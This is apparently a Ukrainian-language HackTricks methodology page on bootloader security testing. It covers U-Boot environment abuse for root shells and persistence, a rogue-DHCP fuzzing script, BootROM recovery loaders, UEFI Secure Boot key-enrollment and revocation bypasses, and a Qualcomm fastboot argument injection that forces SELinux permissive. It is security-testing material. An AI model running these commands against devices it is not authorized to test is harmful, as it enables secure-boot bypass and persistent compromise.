# Тестування bootloader

{{#include ../../banners/hacktricks-training.md}}

Нижче наведено рекомендовані кроки для модифікації конфігурацій запуску пристрою та тестування bootloader, таких як U-Boot і loaders класу UEFI. Зосередьтеся на отриманні виконання коду на ранньому етапі, оцінюванні захисту підписів і rollback, а також на використанні recovery- або network-boot шляхів.

Пов’язане: MediaTek secure-boot bypass через patching bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Швидкі перемоги в U-Boot і зловживання environment

1. Отримайте доступ до interpreter shell
- Під час boot натисніть відому клавішу переривання (часто будь-яку клавішу, 0, пробіл або специфічну для плати "магічну" послідовність) до виконання `bootcmd`, щоб перейти до prompt U-Boot.

2. Перевірте стан boot і змінні
- Корисні команди:
- `printenv` (вивести environment)
- `bdinfo` (інформація про плату, адреси пам’яті)
- `help bootm; help booti; help bootz` (підтримувані методи boot ядра)
- `help ext4load; help fatload; help tftpboot` (доступні loaders)

3. Змініть boot arguments для отримання root shell
- Додайте `init=/bin/sh`, щоб kernel переходив до shell замість звичайного init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Виконайте netboot із вашого TFTP server
- Налаштуйте мережу та отримайте kernel/fit image з LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Збережіть зміни через environment
- Якщо сховище env не захищене від запису, можна зберегти контроль:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Перевірте такі змінні, як `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, що впливають на fallback paths. Неправильно налаштовані значення можуть надати можливість багаторазово переривати boot і переходити до shell.

6. Перевірте debug/небезпечні функції
- Шукайте: `bootdelay` > 0, вимкнений `autoboot`, необмежене виконання `usb start; fatload usb 0:1 ...`, можливість виконання `loady`/`loads` через serial, `env import` із ненадійного носія, а також kernels/ramdisks, завантажені без перевірки підписів.

7. Тестування U-Boot image/verification
- Якщо платформа заявляє secure/verified boot із FIT images, спробуйте як unsigned, так і tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або поведінка legacy `verify=n` часто дозволяє завантажувати довільні payloads.
- Не обмежуйтеся простою перевіркою дозволу/заборони: нещодавні дослідження FIT показали, що сам шлях verification може бути pre-auth attack surface. Виконуйте negative-тестування externally stored FIT data (`data-offset`, `data-position`, `data-size`), вибору signed configuration, `loadables`, а також обробки overlay / `extra-conf`.
- Якщо у вас є відповідне source tree, `test/vboot/vboot_test.sh` — швидкий спосіб відтворити поведінку FIT verification у U-Boot sandbox до роботи зі справжнім hardware.

8. Standard Boot (`bootstd`), `extlinux` і script bootflows
- У сучасних U-Boot builds `bootcmd` часто є лише wrapper навколо Standard Boot. Це означає, що writable media, PXE або SPI flash можуть стати реальною trust boundary, навіть коли видимий environment здається безпечним.
- `extlinux` bootmeth шукає `extlinux/extlinux.conf` у `/` і `/boot`; script bootmeth спочатку шукає `boot.scr.uimg`, а потім `boot.scr`. Під час network boot ім’я script може надходити з `boot_script_dhcp`.
- Корисні команди для triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Випадки для перевірки: attacker-controlled USB/SD media, розташовані раніше в `boot_targets`, writable `/boot/extlinux/extlinux.conf`, rogue TFTP, що надає `boot.scr`, або виконання script зі SPI через `script_offset_f`.
- Якщо платформа покладається на FIT verification, переконайтеся, що configurations підписані на рівні configuration, а не лише окремих images; `required-mode=all` сильніший за прийняття будь-якого одного required key.

## Network-boot surface (DHCP/PXE) і rogue servers

9. Fuzzing параметрів PXE/DHCP
- Legacy BOOTP/DHCP handling в U-Boot мав проблеми memory safety. Наприклад, CVE‑2024‑42040 описує memory disclosure через crafted DHCP responses, які можуть leak bytes із пам’яті U-Boot назад у мережу. Тестуйте DHCP/PXE code paths за допомогою надто довгих або edge-case значень (option 67 bootfile-name, vendor options, поля file/servername) і спостерігайте за зависаннями/leaks.
- Мінімальний Scapy snippet для stress-тестування boot parameters під час netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Також перевірте, чи передаються PXE filename fields до shell/loader logic без sanitization, коли вони ланцюжком передаються до OS-side provisioning scripts.

10. Тестування command injection через rogue DHCP server
- Налаштуйте rogue DHCP/PXE service і спробуйте інжектувати символи у filename або options fields, щоб досягти command interpreters на наступних етапах boot chain. Metasploit DHCP auxiliary, `dnsmasq` або custom Scapy scripts добре підходять для цього. Спочатку ізолюйте lab network.

## SoC ROM recovery modes, що обходять normal boot

Багато SoC надають режим BootROM "loader", який приймає code через USB/UART, навіть коли flash images є недійсними. Якщо secure-boot fuses не запрограмовані, це може надати arbitrary code execution на дуже ранньому етапі chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) або `imx-usb-loader`.
- Приклад: `imx-usb-loader u-boot.imx` для завантаження та запуску custom U-Boot із RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Приклад: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` або `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Приклад: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` для staging loader і upload custom U-Boot.

Перевірте, чи запрограмовані на пристрої secure-boot eFuses/OTP. Якщо ні, BootROM download modes часто обходять будь-яку verification вищого рівня (U-Boot, kernel, rootfs), виконуючи ваш first-stage payload безпосередньо з SRAM/DRAM.

## UEFI/PC-class bootloaders: швидкі перевірки

11. Тестування ESP tampering, rollback і key-enrollment
- Змонтуйте EFI System Partition (ESP) і перевірте loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, paths до vendor logo.
- За можливості виведіть стан Secure Boot і key databases з OS:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Якщо платформа перебуває в Setup Mode, приймає unauthenticated key enrollment або постачається з test/default Platform Key (клас PKfail), local admin або physical attacker може зареєструвати власні KEK/db і зберегти вигляд “enabled” для Secure Boot, завантажуючи довільні EFI binaries.
- Спробуйте boot із downgraded або відомими вразливими signed boot components, якщо Secure Boot revocations (dbx) не оновлені. Якщо платформа все ще довіряє старим shims/bootmanagers, часто можна завантажити власний kernel або `grub.cfg` з ESP для отримання persistence.

12. Тестування stale shim / SBAT / dbx revocation
- Старі Microsoft-signed shims і vendor forks можуть залишатися bootkit path у стилі BYOVD, якщо revocations застарілі. В ізольованій lab розмістіть історично вразливий shim на ESP і спробуйте chainload власного `grubx64.efi` або kernel.
- Швидкий triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Якщо shim усе ще запускається, незважаючи на його наявність у revocation list, firmware/OS має застарілі `dbx` updates або довіряє forked loader, який ніколи не успадкував upstream SBAT protections.

13. Bugs парсингу boot logo (клас LogoFAIL)
- Деякі OEM/IBV firmwares були вразливими до image-parsing flaws у DXE, що обробляє boot logos. Якщо attacker може розмістити crafted image на ESP за vendor-specific path (наприклад, `\EFI\<vendor>\logo\*.bmp`) і перезавантажити пристрій, виконання коду під час раннього boot може бути можливим навіть із увімкненим Secure Boot. Перевірте, чи приймає платформа user-supplied logos і чи доступні ці paths для запису з OS.


## Android/Qualcomm ABL + GBL (Android 16): прогалини довіри

На Android 16 devices, які використовують Qualcomm ABL для завантаження **Generic Bootloader Library (GBL)**, перевірте, чи **автентифікує** ABL UEFI app, яку він завантажує з partition `efisp`. Якщо ABL перевіряє лише **наявність** UEFI app і не перевіряє signatures, primitive запису в `efisp` перетворюється на **pre-OS unsigned code execution** під час boot.

Практичні перевірки та abuse paths:

- **efisp write primitive**: потрібен спосіб записати custom UEFI app в `efisp` (root/privileged service, bug в OEM app, recovery/fastboot path). Без цього GBL loading gap недоступний безпосередньо.
- **fastboot OEM argument injection** (ABL bug): деякі builds приймають додаткові tokens у `fastboot oem set-gpu-preemption` і додають їх до kernel cmdline. Це можна використати для примусового permissive SELinux, що дозволяє запис до protected partitions:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Якщо пристрій patched, команда має відхиляти додаткові arguments.
- **Bootloader unlock через persistent flags**: payload на boot-stage може змінити persistent unlock flags (наприклад, `is_unlocked=1`, `is_unlocked_critical=1`), імітуючи `fastboot oem unlock` без OEM server/approval gates. Це є стійкою зміною posture після наступного reboot.

Захисні/triage notes:

- Підтвердьте, чи виконує ABL signature verification GBL/UEFI payload із `efisp`. Якщо ні, розглядайте `efisp` як high‑risk persistence surface.
- Перевірте, чи handlers ABL fastboot OEM patched для **перевірки кількості arguments** і відхилення додаткових tokens.

## Hardware caution

Будьте обережні під час роботи зі SPI/NAND flash на ранньому етапі boot (наприклад, із заземленням pins для bypass reads) і завжди консультуйтеся з flash datasheet. Несвоєчасні shorts можуть пошкодити пристрій або programmer.

## Notes та додаткові tips

- Спробуйте `env export -t ${loadaddr}` і `env import -t ${loadaddr}` для переміщення environment blobs між RAM і storage; деякі платформи дозволяють імпортувати env зі removable media без authentication.
- Для persistence у Linux-based systems, які boot через `extlinux.conf`, часто достатньо змінити рядок `APPEND` (щоб інжектувати `init=/bin/sh` або `rd.break`) на boot partition, якщо signature checks не застосовуються.
- Якщо target використовує dual-slot / A/B updates, перегляньте anti-rollback і slot-desync techniques у [firmware analysis overview](README.md), щоб не пропустити updater-only trust gaps поза самим bootloader.
- Якщо userland надає `fw_printenv/fw_setenv`, перевірте, що `/etc/fw_env.config` відповідає реальному env storage. Неправильно налаштовані offsets дозволяють читати/записувати неправильний MTD region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
